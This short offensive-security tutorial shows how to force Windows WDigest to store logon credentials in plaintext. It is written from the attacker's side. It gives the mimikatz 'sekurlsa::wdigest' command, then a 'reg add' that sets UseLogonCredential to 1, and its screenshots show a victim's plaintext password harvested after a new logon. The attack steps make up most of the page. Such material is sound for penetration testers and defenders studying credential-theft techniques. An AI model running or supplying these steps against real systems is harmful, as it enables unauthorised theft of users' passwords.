# Forcing WDigest to Store Credentials in Plaintext

## Forcing WDigest to Store Credentials in Plaintext

As part of WDigest authentication provider, Windows versions up to 8 and 2012 used to store logon credentials in memory in plaintext by default, which is no longer the case with newer Windows versions.

It is still possible, however, to force WDigest to store secrets in plaintext.

### Execution

Let's first make sure that wdigest is not storing credentials in plaintext on our target machine running Windows 10:

{% code title="attacker\@victim" %}
```csharp
sekurlsa::wdigest
```
{% endcode %}

Note the password field is null:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Len3nmlhA6UjceGHwfy%2F-Len8hmyBCCq_APtNrRy%2Fmimikatz%202.2.0%20x64%20\(oe.eo\)%205_13_2019%2010_42_39%20PM.png?alt=media\&token=9285ff25-5be4-46ee-875f-3a10c7d65a74)

Now as an attacker, we can modify the following registry key to force the WDigest to store credentials in plaintext next time someone logs on to the target system:

{% code title="attacker\@victim" %}
```csharp
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Len3nmlhA6UjceGHwfy%2F-Len8zaUU1lFgwsk8m_h%2Fmimikatz%202.2.0%20x64%20\(oe.eo\)%205_13_2019%2010_44_54%20PM.png?alt=media\&token=ee922398-8fa2-4e74-8cea-00512553bc0a)

Say, now the victim on the target system spawned another shell:

{% code title="victim\@local" %}
```csharp
runas /user:mantvydas powershell
```
{% endcode %}

Running mimikatz for wdigest credentials now reveals the plaintext password of the victim user `mantvydas`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Len3nmlhA6UjceGHwfy%2F-Len9_dheta4yMa8yqY0%2Fwdigestdemo.gif?alt=media\&token=a54f70a3-9ff7-411f-a426-bf89303edd47)

### References
